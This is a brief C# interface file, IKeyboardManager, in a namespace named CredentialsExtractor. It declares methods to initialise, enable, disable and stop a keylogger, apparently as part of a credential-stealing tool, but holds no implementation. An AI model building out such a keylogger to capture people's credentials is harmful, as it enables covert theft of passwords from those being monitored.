namespace CredentialsExtractor.Input
{
    public interface IKeyboardManager : System.IDisposable
    {
        bool Initialize();
        void EnableKeylogger();
        void DisableKeylogger();
        void StopKeylogger();
    }
}